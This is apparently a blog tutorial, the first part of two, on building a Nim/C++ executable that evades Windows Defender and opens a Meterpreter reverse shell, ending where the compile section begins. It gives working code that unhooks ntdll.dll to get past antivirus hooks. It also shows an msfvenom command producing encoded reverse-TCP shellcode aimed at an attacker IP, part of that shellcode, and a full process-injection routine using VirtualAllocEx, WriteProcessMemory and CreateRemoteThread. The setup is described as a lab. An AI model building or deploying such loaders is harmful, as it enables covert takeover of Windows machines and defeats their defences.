# Process-injection and Bypass of Windows Defender in Nim/C++

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Section 0:  Introduction

=======================================================

In this two part post, we will combine two templates from the Offensive Nim Github repository and some C++ code to execute a process injection of Meterpreter shellcode which evades detection by Windows Defender.  The result is a Nim project that compiles to a standalone Windows x64 executable with a hardcoded Attacker IP address and Port to connect to.  When run on the victim, the .exe results in a Meterpreter reverse TCP shell on our attacker.

Part 1 will cover the entire process and steps to get a working executable compiled.  Part 2 will explore the Windows API functions and the C++ and Nim code more in depth.

The code we will write accomplishes five major tasks:

-1- Use C++ code to load a new copy of ntdll.dll and permit access to Windows API functions without Anti-Virus hooks.

-2- Spawn a process (notepad.exe) and immediately suspend it.

-3- Prepare memory inside the suspended process to make room for our shellcode.

-4- Write our shellcode to the prepared memory section.

-5- Create a new thread and execute our shellcode, creating a Meterpreter shell.

<p>&nbsp;</p>
=======================================================

## Section 1:  Requirements

=======================================================

For this project I used a Windows 10 laptop to run two Virtual Machines as follows:

![](/images/nim_proc_inject_pt1/1. lab_setup.png "Lab Setup")

#### Development Machine 

Windows 10 Home Version 21H1 (OS Build 19043.1110), fully updated with Windows Defender and MalwareBytes as antivirus options.  Windows Defender was turned on with the exception of "Automatic sample submission" throughout this project.

During the guide we will install the following additional software on the Development Machine:

-1- Git
    
-2- Visual Studio Code 1.58.2
    
-3- Nim version 1.4.8 and our required Nim packages
    
-4- MingW compiler from the Nim website
    

#### Attacker Machine

Kali Linux or Parrot OS.  Really anything that can run Metasploit as we will use msfvenom and msfconsole to make this part easier on ourselves.  For this project I used Kali Linux 2021, with root user access and Metasploit Framework 5.

#### Victim Machine

Windows 10 machine or VM with an unprivileged user account and Windows Defender enabled with all options turned on except automatic sample submission.  The specific VM I used is a Windows 10 Enterprise VM on an Active Directory Lab I built, Windows Version 21H1 OS Build 19043.1110.  During the walkthrough I used a local user (non-domain user) without administrative privileges. The .iso used to initially install and then update Windows was from the Microsoft Windows 10 Enterprise Evaluation Center:  https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise 

I did not include instructions on VM/network setup in this guide so this is completely up to you.  Make sure the Attacker and Victim VMs are on the same network and can ping each other.

<p>&nbsp;</p>
=======================================================

## Section 2: Lab Setup

=======================================================


#### Attacker machine

Default install of Kali Linux or Parrot OS is fine.  Again all we need is access to Metasploit Framework 5 so this guide does not cover baseline setup for the Attacker Machine.  Specific steps to configure Metasploit to receive our Meterpreter reverse TCP connection are covered in the Section 6: Execution.

#### Victim Machine

Nothing to do just yet.  Again, just ensure the Attacker and Victim Machines can ping each other.


#### Development Machine

Install git:  https://git-scm.com/download/win

![](/images/nim_proc_inject_pt1/2. git_download.png "Git Download")


Choose the Setup file applicable to your machine. Likely the 64-bit one. 

Download and install it.

![](/images/nim_proc_inject_pt1/3. git_install.png "Git Install")

You can accept the defaults or customize it to your preference.  There are several screens to click through but eventually Git will install:

![](/images/nim_proc_inject_pt1/4. git_install2.png "Git Install")

Once install is complete click Finish.

Next, install Visual Studio Code: https://code.visualstudio.com/download

![](/images/nim_proc_inject_pt1/5. vscode.png "VS Studio Code Website")

Choose "User Installer" and whatever architecture you have, most likely 64 bit.

The download should start automatically:

![](/images/nim_proc_inject_pt1/6. vscode_download.png)

When the download completes, click "Open File" or navigate to your Downloads folder and run it.

Click the button next to Accept the license agreement and then click Next:

![](/images/nim_proc_inject_pt1/7. vscode_license.png)

Choose your install location or click Next to accept the default:

![](/images/nim_proc_inject_pt1/8. vscode_install1.png)

Click Next to name the Start Menu folder:

![](/images/nim_proc_inject_pt1/9. vscode_install2.png)
 
Ensure the box next to "Add to PATH" is checked. You can check other boxes at your preference.  Then click Next:

![](/images/nim_proc_inject_pt1/10. vscode_install3.png)
 
On the "Ready to Install" screen, confirm your settings and then click Install:

![](/images/nim_proc_inject_pt1/11. vscode_install4.png)
 
When the install is complete, check the box for "Launch Visual Studio Code" and then click Finish:

![](/images/nim_proc_inject_pt1/12. vscode_install5.png)

On initial run, Visual Studio Code will look like this:

![](/images/nim_proc_inject_pt1/13. vs_code.png)

Close the window in the lower right.  We will disable Microsoft telemetry in a moment.

Choose the Theme you want.  I will stay with Dark for this walkthrough.  Click "Next Section" through the first few options. If you wish to change anything go ahead.  I left defaults.  You will get to the opening screen that looks like this:

![](/images/nim_proc_inject_pt1/14. vs_code.png)

Now we will disable Microsoft telemetry:  Click File -> Preferences -> Settings:

![](/images/nim_proc_inject_pt1/15. vs_code.png)

In the search bar, search for "telemetry" and uncheck the "Telemetry: Enable Crash Reporter" and  "Telemetry: Enable Telemetry" settings.

![](/images/nim_proc_inject_pt1/16. vs_code.png)

Close the Settings tab.

Click on the Extensions button on the left panel.  In the search bar, type "nim".

Click the Install button next to the Nim extensions made by Konstantin Zaitsev and nimsaem:

![](/images/nim_proc_inject_pt1/17. vs_code.png)

Once they are installed your screen should look like this:

![](/images/nim_proc_inject_pt1/18. vs_code.png)

These two extensions provide a near-complete development setup for the Nim language in Visual Studio Code.

At this point we can close Visual Studio Code as it is time to install Nim.

Browse to https://nim-lang.org/install_windows.html

![](/images/nim_proc_inject_pt1/19. nim_download.png)

Choose the appropriate zip file for your setup, likely the x86_64.  This will download a .zip file with the necessary Nim install files.

As of late July 2021, Windows Defender alerts on some of the Nim files during download or extraction.  You can choose to turn Defender's Real time protection off during install and the build, but it will still detect the Nim files when we turn it on later.  The best option is to allow them in Security Settings when the alert appears:

![](/images/nim_proc_inject_pt1/20. alert1.png)

![](/images/nim_proc_inject_pt1/21. alert2.png)

Open the .zip file and extract the nim directory:

![](/images/nim_proc_inject_pt1/22. extract.png)

When the extracted files are shown, run "finish.exe"

![](/images/nim_proc_inject_pt1/23. finish1.png)

If Windows initially blocks the application from running, click "More Info" and then "Run anyway"

![](/images/nim_proc_inject_pt1/24. finish2.png)

Type "y" to answer the first three questions:

![](/images/nim_proc_inject_pt1/25. finish3.png)

MingW will download and install:

![](/images/nim_proc_inject_pt1/26. finish4.png)

![](/images/nim_proc_inject_pt1/27. finish5.png)

Lastly, you can choose y or n for the final question:

![](/images/nim_proc_inject_pt1/28. finish6.png)

For some reason, MingW does not get added to your path.  So once finish.exe exits, run it again and it will detect that MingW is not in your path and as you if you would like to add it permanently.  Enter "y".

Log off the machine and log back in so your path/environment can update.  Confirm your updated path is correct in either a command prompt or powershell.

Command prompt/cmd.exe:

    path

![](/images/nim_proc_inject_pt1/29. cmd_path.png)

PowerShell:

    $env:Path

![](/images/nim_proc_inject_pt1/30. ps_path.png)

You should see the VS Code\bin, nim\bin, .nimble\bin, Git\cmd, and mingw64\bin in your path.

Before we get to work in Visual Studio Code, we need to install three Nim packages.  Open a cmd prompt and run the command "nimble install winim zippy nimcrypto"

    nimble install winim zippy nimcrypto

![](/images/nim_proc_inject_pt1/31. nimble_install1.png)

![](/images/nim_proc_inject_pt1/32. nimble_install2.png)


Open Visual Studio Code and click Open Folder on the left:

![](/images/nim_proc_inject_pt1/33. vs_code.png)


Navigate to or create a new folder to hold your .nim files.  I made mine simple: "C:\projects"

![](/images/nim_proc_inject_pt1/34. vs_code.png)

If you receive the above message for your chosen folder, choose "Yes I trust the authors".

Next click "New File" to create a blank file.  Then click Save As and save it as "av_bypass" and choose Nim as the type:

![](/images/nim_proc_inject_pt1/35. save_as.png)

Visual Studio Code should now look something like this:

![](/images/nim_proc_inject_pt1/36. vs_code.png)

One last user interface item:  Go to View -> Word Wrap

This is ultimately an individual preference, but I prefer my code to stay on the screen and the remaining screenshots will have this feature enabled.  With that complete though...

<p>&nbsp;</p>
=======================================================

## Section 3:  A/V Bypass Code in Nim & C++

=======================================================

We are finally ready to start coding!  

As we walk through the code and basic explanation, we will include comments.  I prefer to pre-comment blocks of code that follow the logical sequence of what I will write, so for our av_bypass program we start with a shell that looks like this:

    ### begin initial comments
    
    ### end initial comments
    
    
    ### begin import lines
    
    ### end import lines
    
    
    ### begin av evasion (c++ code)
    
    ### end av evasion (c++ code)
    
    
    ### begin process injection
    
    ### end process injection
    
    
    ### begin mainmodule
    
    ### end mainmodule

If you have your own method, please use it.  I have found the above process works for me.  As we finish a block of code, we can remove the begin / end comments for that block.

For now, a re-cap of our overall outline of this project:

The code we will write accomplishes five major tasks:

-1- Use C++ code to load a new copy of ntdll.dll and permit access to Windows API functions without Anti-Virus hooks.

-2- Spawn a process (notepad.exe) and immediately suspend it.

-3- Prepare memory inside the suspended process to make room for our shellcode.

-4- Write our shellcode to the prepared memory section.

-5- Create a new thread and execute our shellcode, creating a Meterpreter shell.

In the below code snippet, we first describe the overall purpose of the program, followed by an outline and some specific compile notes.  There will be some comments throughout the code, but another personal preference is to leave this type of general information at the top.

    ### begin initial comments
    
    # av_bypass.nim : process inject and execute shellcode with anti-virus evasion (in this case windows defender) to obtain a meterpreter reverse shell
    
    # outline
    ### 1) Use C++ code to load a new copy of ntdll.dll and permit access to Windows API functions without Anti-Virus hooks
    ### 2) Spawn a process (notepad.exe) and immediately suspend it
    ### 3) Prepare memory inside the suspended process to make room for our shellcode
    ### 4) Write our shellcode to the prepared memory section
    ### 5) Create a new thread and execute our shellcode, creating a Meterpreter shell
    
    # compile notes
    ### 1) compile with three statically-linked .dll files for standalone execution on target:
    ###### a) libgcc_s_seh-1.dll
    ###### b) libstdc++-6.dll
    ###### c) libwinpthread-1.dll
    
    ### end initial comments

The next lines we need are our imports for Nim libraries.  While short, this section is so important that it gets its own block in my pre-commented code.  We will be using winim/lean and osproc:


    ### begin import lines
    
    import winim/lean
    import osproc
    
    ### end import lines


The Readme.md file from the Winim Github page describes it best: "Winim contains Windows API, struct, and constant definitions for Nim. The definitions are translated from MinGW's Windows headers and Windows 10 SDK headers."  

These two libraries allow us to use Nim code to leverage the Windows API functions we need for the process injection portion of our code.  Again, the import lines are ones I prefer to have at the top of my program as standard practice.

From the Offensive Nim Github, we have a rough template to embed C++ code in our Nim program:  https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/clr_host_cpp_embed_bin.nim

However, this example is for embedding C++ code to run assembly code.  Fortunately, there is https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/ .  Approximately 3/4 through that post is the following code, adapted from the https://www.ired.team post referenced in the comment on line #4:


    ### begin av evasion (c++ code)
    
    when not defined(cpp):
        {.error: "Must be compiled in cpp mode"}
    # Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
    
    {.emit: """
    #include <iostream>
    #include <Windows.h>
    #include <winternl.h>
    #include <psapi.h>
    
    int test()
    {
        HANDLE process = GetCurrentProcess();
        MODULEINFO mi = {};
        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
        
        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    
        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
    
        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            
            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                DWORD oldProtection = 0;
                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            }
        }
        
        CloseHandle(process);
        CloseHandle(ntdllFile);
        CloseHandle(ntdllMapping);
        FreeLibrary(ntdllModule);
        
        return 1;
    }
    """.}
    proc unhook(): int
        {.importcpp: "test", nodecl.}
    
    ### end av evasion (c++ code)
    
    when isMainModule:
        var result = unhook()
        echo "[*] Assembly executed: ", bool(result)
        # Every code from here is not hooked / detected from Windows API imports at runtime anymore
    

In the above, I inserted only the code dealing directly with the C++ code between the av evasion comments.  This is because the section on line 53 that starts with “when isMainModule” is the main body of our code that will move to the end.  The C++ portion of this code is everything from line 8 {.emit: """   all the way to   """} on line 47.  

In Part Two of this post, I will look deeper into what each section of this code is doing, but as an overview, this Nim-wrapped C++ code detects the handles of the current process (our av_bypass.exe) and the ntdll.dll file loaded on initialization.  It then loads a new instance of the ntdll.dll file in memory, unlinks the old ntdll and re-maps to the new before cleaning up.

As a final step here, delete everything after the "proc unhook(): int" function shown in lines 10 and 11 below and insert the comments and several blank lines to create a working area to add the process injection code:

    when not defined(cpp):
        {.error: "Must be compiled in cpp mode"}
    # Stolen from https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
    
    {.emit: """
    #include <iostream>
    #include <Windows.h>
    #include <winternl.h>
    #include <psapi.h>
    
    int test()
    {
        HANDLE process = GetCurrentProcess();
        MODULEINFO mi = {};
        HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
        
        GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
        LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
        HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    
        PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
        PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);
    
        for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
            PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
            
            if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
                DWORD oldProtection = 0;
                bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
                memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
                isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
            }
        }
            
        CloseHandle(process);
        CloseHandle(ntdllFile);
        CloseHandle(ntdllMapping);
        FreeLibrary(ntdllModule);
        
        return 1;
    }
    """.}
    proc unhook(): int
        {.importcpp: "test", nodecl.}
        
    ### begin process injection code
        
        
        
    ### end process injection code



<p>&nbsp;</p>
=======================================================

## Section 4:  Process Injection Code in Nim

=======================================================

We are now ready to introduce our process injection code.  We will use three Windows API functions to execute a basic and "loud" process injection technique covered in the https://huskyhacks.dev/2021/07/17/nim-exploit-dev/ post.  Part 1 of this post will provide the code with a broad overview for each block.  Part 2 will dig into the Winim and osproc libraries as well as the Windows API to explain the code in more detail.  

The three Windows API functions we are going to use to inject our shell code are:

-1- VirtualAllocEx

-2- WriteProcessMemory

-3- CreateRemoteThread

You will see these functions appear in our Nim code below, but I will not discuss them in depth until Part 2 of this post.

First, we need some shellcode to inject and then execute.  To prepare our shellcode we will use our Attacker Machine to run an msfvenom command that will output the shellcode to a file.  We need to know the IP address of the Attacker Machine and an unused TCP port we will run our Metasploit listener on.  In my case these are 192.168.3.28 and 1701 respectively.  Your IP address will likely be different, and feel free to choose a different port number as long as it is not already in use.

#### Attacker Machine 

In a terminal window:

    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.3.28 LPORT=1701 -f csharp -e x64/zutto_dekiru -i 2 > code.out

This command does the following:

msfvenom  :  Metasploit's standalone payload generator

-p windows/x64/meterpreter_reverse_tcp  :  Use the payload for a non-staged Meterpreter reverse TCP shell on Windows 64-bit architecture.

LHOST=192.168.3.28  :  Set the IP address to connect to as 192.168.3.28.

LPORT=1701  :  Set the TCP port to connect to as 1701.

-f csharp  :  Set the format of the output to C# code.  This keeps the format Nim-friendly.

-e x64/zutto_dekiru  :  Encode the payload using the 64-bit zutto dekiru algorithm.

-i 2  :  Run the zutto_dekiru algorithm over the code two times.  Each iteration slightly increases the size of the payload.

\> code.out  :  Redirect the standard output to a file named code.out.

![](/images/nim_proc_inject_pt1/37. msfvenom.png)

#### Development Machine

We need to use two items from the output of the msfvenom command.  The first is the final Payload size, in my case 201391 bytes (yours may be different).  The second is the payload itself which is in the code.out file.  First let's update our code with some additional comments to document what we are doing.  This code should start immediately following the end of the C++ code section:

    ### begin process injection code
    
    # shellcode payload: this is prepared on our attacker machine and then included in our code 
    ### 1) msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.3.28 LPORT=1701 -f csharp -e x64/zutto_dekiru -i 2
    ### 2) The msfvenom command will generate a little over 200,000 bytes to include in our code since it must include a full meterpreter shell (non-staged). An explanation of the options:
    ###### a) -p (payload) is for windows 64-bit, non-staged meterpreter reverse tcp shell
    ###### b) LHOST is the IP address of our attacker machine
    ###### c) LPORT is the port we are listening on
    ###### d) -f csharp to format shellcode for our use
    ###### e) -e x64/zutto_dekiru to encode the payload for static anti-virus inspection of the binary
    ###### f) -i 2 for two iterations of zutto_dekiru encoding. each iteration slightly increases the overall file size, but more iterations can help protect from inspection
    
    ### end process injection code


Next we are going to input the shellcode we generated with msfvenom.  The format for our shellcode will be: 

    var shellcode: array[<payload size in bytes>, byte] = [ byte <shellcode> ]

Substitute the number of bytes for <payload size in bytes>, so in my case:  

    var shellcode: array[201391, byte] = [ byte <shellcode> ]
  
The shellcode itself will take a bit more to get into our code file.  As you can see below from my heavily trimmed output, the shellcode in code.out is over 13,000 lines long.  Fortunately we do not need to alter it much.

![](/images/nim_proc_inject_pt1/38. shellcode1.png)
trimmed
![](/images/nim_proc_inject_pt1/39. shellcode2.png)

#### Attacker Machine

We use a text editor to remove the first line:  "byte[] buf = new byte[201391] { "

Also remove the " }; " at the end of the file.  

You can do this in your editor of choice, and then save code.out again.

For reference, here are the results of head and then tail on code.out after I made the changes:

![](/images/nim_proc_inject_pt1/40. head.png)

![](/images/nim_proc_inject_pt1/41. tail.png)


Next we need to strip the newline character at the end of each line so all of the shellcode ends up on a single line.  We can use a built-in Linux command "tr" to do this:

    tr -d '\n' <code.out > code_stripped.out

Where:

tr  :  Truncate command.

-d '\n'  :  Search for and remove the delimeter for the newline character.

<code.out  :  Take input for this command from the file code.out.

\> code_stripped.out  :  Place the output of this command into the file code_stripped.out.

#### Developer Machine
    
Now, you can drag and drop code_stripped.out over to your Development Machine, open it, and copy/paste the shellcode into av_bypass.nim.  I have trimmed the output here to fit in the code box.  Your actual code will be several thousand lines:

    var shellcode: array[201391, byte] = [ byte 0xd9,0xc3,0x48,0xbb,0xd3,0x76,0x8b,0x6e,0xea,0xe9,0xaa,0x6b,0x54,0x4d,0x31,0xed,0x41,0x5c,0x66,0x41,0xbd,0x4f,0x62,0x66,0x41,0x81,0xe4,0x10,0xf6,0x49,0x0f,0xae,0x04,0x24,0x49,0x83,0xc4,0x08,0x49,0x8b,0x3c,0x24,0x49,0xff,0xcd,0x4a,0x31,0x5c,0xef,0x37,0x4d,0x85,0xed,0x75,0xf3,0x9b,0xff,0x68,0x08,0x6b,0x0a,0xda,0x91,0x9b,0x47,0x42,0x26,0x52,0xf9,0xb6,0x77,0x62,0x64,0xec,0xed,0xb7,0x30,0x66,0x23,0xdc,0xd8,0x88,0x08,0x53,0xa0,0xc8,0x23,0x58,0x05,0x83,0x26,0x15,0x20,0xe2,0x5a,0x97,0xb8,0x90,0x26,0x6f,0x20,0xdf,0x98,0x8e,0x30,0xd6,0x8d,0xad,0xc6,0xa0,0xd3,0x8b,0xe9,0x7b,0xff,0xb0,0x0d,0xcd,0xc6,0x2b,0x6a,0x97,0xdf,0xf8,0xd5,0x61,0xb7,0x00,0xdd,0xc0,0xdf,0xf8,0x71,0xfa,0x7e,0x42,0xa9,0xa3,0x69,0xfa,0x8e,0x60,0xbf,0x1b
    output trimmed
    0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xef,0x6b,0x97,0xdf,0xe8,0x80,0x29,0x36,0xc9,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0x6a,0xd7,0xaa,0x61,0xca,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3, ]
    
    ### end process injection code


With our shellcode array stored in the variable "shellcode", we can now write the core of the process injection function.  The following code should start on the line after your shellcode variable:

    proc injector[I, T](shellcode: array[I, T]): void =
        echo "[*] Initializing injector."
    
    # Start and suspend a process:
        let injectedProcess = startProcess("C:\\Windows\\system32\\notepad.exe")
        injectedProcess.suspend()
        echo "[*] Started and suspended process: ", injectedProcess.processID
        
    ### end process injection code


First we define our function, which in Nim is called a procedure.  We pass our shellcode variable into the procedure, and print a line of text to standard out.  The next lines start an instance of notepad.exe and immediately suspend it, which causes the window to remain unseen.


    # Open the process so we can access it with a handle
        let processHandle = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](injectedProcess.processID))
    
        echo "[*] Injected process handle: ", processHandle
        
    ### end process injection code


Next we access our suspended process and assign that action to the variable processHandle and print another line of text to standard out.


    # Call VirtualAllocEx to make some memory space
        let memPointer = VirtualAllocEx(processHandle,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    
    ### end process injection code

Here we use the VirtualAllocEx function to create enough memory space inside our suspended process to hold our shellcode and set the permissions to allow us to read, write, and execute code in our process.  This action would normally be flagged by Windows Defender if we had not loaded our own ntdll.dll.


    # Call WriteProcessMemory to write shellcode to our memory space
        var bytesWritten: SIZE_T
        let writeProcess = WriteProcessMemory(processHandle,memPointer,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)
    
        echo "[*] WriteProcessMemory: ", bool(writeProcess)
        echo "    \\-- bytes written: ", bytesWritten
        echo ""
    
    ### end process injection code


In this block, we use the WriteProcessMemory function to write the shellcode to our prepared memory space and then print some results to standard out.

    # Call CreateRemoteThread to execute a thread with our shellcode
        let threadHandle = CreateRemoteThread(processHandle,NULL,0,cast[LPTHREAD_START_ROUTINE](memPointer),NULL,0,NULL)
    
    # It works, print final messages to stdout.
        echo "[+] Thread Handle: ", threadHandle
        echo "[*] Enjoy your shell!"
        
        ### end process injection code


Finally, we use the CreateRemoteThread function to execute the shellcode within our process and print two messages to standard out.

Putting it all together, our process injection code block should look something like this.  Your shellcode will be much longer and the number of bytes may vary slightly.

    ### begin process injection code
    
    var shellcode: array[201391, byte] = [ byte 0xd9,0xc3,0x48,0xbb,0xd3,0x76,0x8b,0x6e,0xea,0xe9,0xaa,0x6b,0x54,0x4d,0x31,0xed,0x41,0x5c,0x66,0x41,0xbd,0x4f,0x62,0x66,0x41,0x81,0xe4,0x10,0xf6,0x49,0x0f,0xae,0x04,0x24,0x49,0x83,0xc4,0x08,0x49,0x8b,0x3c,0x24,0x49,0xff,0xcd,0x4a,0x31,0x5c,0xef,0x37,0x4d,0x85,0xed,0x75,0xf3,0x9b,0xff,0x68,0x08,0x6b,0x0a,0xda,0x91,0x9b,0x47,0x42,0x26,0x52,0xf9,0xb6,0x77,0x62,0x64,0xec,0xed,0xb7,0x30,0x66,0x23,0xdc,0xd8,0x88,0x08,0x53,0xa0,0xc8,0x23,0x58,0x05,0x83,0x26,0x15,0x20,0xe2,0x5a,0x97,0xb8,0x90,0x26,0x6f,0x20,0xdf,0x98,0x8e,0x30,0xd6,0x8d,0xad,0xc6,0xa0,0xd3,0x8b,0xe9,0x7b,0xff,0xb0,0x0d,0xcd,0xc6,0x2b,0x6a,0x97,0xdf,0xf8,0xd5,0x61,0xb7,0x00,0xdd,0xc0,0xdf,0xf8,0x71,0xfa,0x7e,0x42,0xa9,0xa3,0x69,0xfa,0x8e,0x60,0xbf,0x1b
    output trimmed
    0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xef,0x6b,0x97,0xdf,0xe8,0x80,0x29,0x36,0xc9,0x6a,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3,0x6a,0x97,0x6a,0xd7,0xaa,0x61,0xca,0x97,0xdf,0xf8,0x8e,0x29,0x36,0xc3, ]
    
    proc injector[I, T](shellcode: array[I, T]): void =
        echo "[*] Initializing injector."
    
    # Start and suspend a process:
        let injectedProcess = startProcess("C:\\Windows\\system32\\svchost.exe")
        injectedProcess.suspend()
        echo "[*] Started and suspended process: ", injectedProcess.processID
    
    # Open the process so we can access it with a handle
        let processHandle = OpenProcess(PROCESS_ALL_ACCESS,false,cast[DWORD](injectedProcess.processID))
    
        echo "[*] Injected process handle: ", processHandle
    
    # Call VirtualAllocEx to make some memory space
        let memPointer = VirtualAllocEx(processHandle,NULL,cast[SIZE_T](shellcode.len),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
    
    # Call WriteProcessMemory to write shellcode to our memory space
        var bytesWritten: SIZE_T
        let writeProcess = WriteProcessMemory(processHandle,memPointer,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)
    
        echo "[*] WriteProcessMemory: ", bool(writeProcess)
        echo "    \\-- bytes written: ", bytesWritten
        echo ""
    
    # Call CreateRemoteThread to execute a thread with our shellcode
        let threadHandle = CreateRemoteThread(processHandle,NULL,0,cast[LPTHREAD_START_ROUTINE](memPointer),NULL,0,NULL)
    
    # It works, print final messages to stdout.
        echo "[+] Thread Handle: ", threadHandle
        echo "[*] Enjoy your shell!"
        
        ### end process injection code


All that is left to write is our MainModule, which is relatively simple:

    ### begin mainmodule
    
    # Engage
    when isMainModule:
        var result = unhook()
        echo "[*] Assembly executed: ", bool(result)
        # Every code from here is not hooked / detected from Windows API imports at runtime anymore
        injector(shellcode) 
    
    ### end mainmodule

The bulk of our MainModule is from the original code snippet from the end of the av evasion section of our code that we deleted earlier.  Insert this code into our mainmodule section.  The only line we need to add to execute our process injection code is line 8 in the above, "injector(shellcode)".  

Once you have added everything, be sure to save the file.  Now we need to compile our code.

<p>&nbsp;</p>
=======================================================

## Section 5:  Compile-time

=======================================================

To compile the project, open a Terminal in Visual Studio Code by choosing Terminal -> New Terminal.

